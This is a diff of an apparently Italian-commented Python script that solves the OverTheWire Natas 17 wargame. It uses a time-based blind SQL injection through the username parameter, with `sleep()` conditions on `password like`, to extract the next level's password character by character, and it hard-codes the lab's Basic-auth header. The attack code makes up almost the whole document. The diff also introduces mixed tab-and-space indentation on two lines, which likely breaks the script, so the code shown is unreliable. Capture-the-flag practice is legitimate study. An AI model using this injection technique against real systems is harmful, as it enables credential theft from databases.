@@ -7,9 +7,9 @@ from string import ascii_letters
 from string import digits
 from time import sleep
 from time import time
-from requests import get            # ==>  per fare richieste get
-from urllib.parse import quote      # ==>  per fare codificare l'injection in codifica URL
-alpha_numeric  = ascii_letters + digits
+from requests import get                # ==>  per fare richieste get
+from urllib.parse import quote          # ==>  per fare codificare l'injection in codifica URL 
+alpha_numeric  = ascii_letters + digits + '{}'
 delay          = 0.1
 sleep_sec      = 1
 
@@ -17,7 +17,6 @@ sleep_sec      = 1
 #   il valore è un base64 dell'utente e della password
 header={'Host'         : 'natas17.natas.labs.overthewire.org'\
        ,'Authorization': 'Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=='}
-
 
 
 #Nella prima parte si applica la query { natas18" and if(password like '___' , sleep(1), 0); # } 
@@ -36,15 +35,16 @@ while True:
     injection = quote( injection,safe= '')
     url = 'http://natas17.natas.labs.overthewire.org/?username='+ injection
     
-    req  = get( url, headers= header )
-    
+    req = get( url, headers= header )    
+
+    #Potrebbe succedere che a causa di ritardi nella rete una richiesta impieghi più tempo del previsto
+    #   per sicurezza viene effettuata una seconda prova
     if( req.status_code == 200 ):
         if( req.elapsed.seconds >= sleep_sec ):
             
-            #Potrebbe succedere che a causa di ritardi nella rete una richiesta impieghi più tempo del previsto
-            #   per sicurezza viene effettuata una seconda prova
             print( 'Request produced http_code 200 in ' +str( req.elapsed.seconds )+ ' secs > ' +str( sleep_sec )+ '\nRetesting in 1 sec...')
             sleep ( 1 )
+
             req = get( url , headers= header )
             if( req.elapsed.seconds >= sleep_sec ):
                 break
@@ -76,9 +76,11 @@ while( i < password_length ):
         injection = injection +'\', sleep(' +str( sleep_sec )+ '), 0); # ' 
         print( 'Testing '+injection )
 
-        injection = quote( injection,safe='' )
-        url = 'http://natas17.natas.labs.overthewire.org/?username=' + injection
-        req = get( url, headers= header )
+        injection = quote( injection,safe='' )        
+	    url = 'http://natas17.natas.labs.overthewire.org/?username=' +injection
+        
+	    req = get( url, headers= header )
+
 
         if( req.status_code==200 ):
             if( req.elapsed.seconds >= sleep_sec ):
@@ -93,6 +95,7 @@ while( i < password_length ):
                     print( 'The char of position '+ str(i) +' is : '+ char )
                     break
             
+
             #Nel caso in cui non si trova una corrispondenza finendo i caratteri a disposizione
             #   si ipotizza che ci sia stato un problema con la richiesta e quindi si decrementa
             #   la i per riprovare la posizione che ha fallito
@@ -113,4 +116,3 @@ while( i < password_length ):
     i+= 1
 
 print( 'We have the password! Here it is: '+password )
-
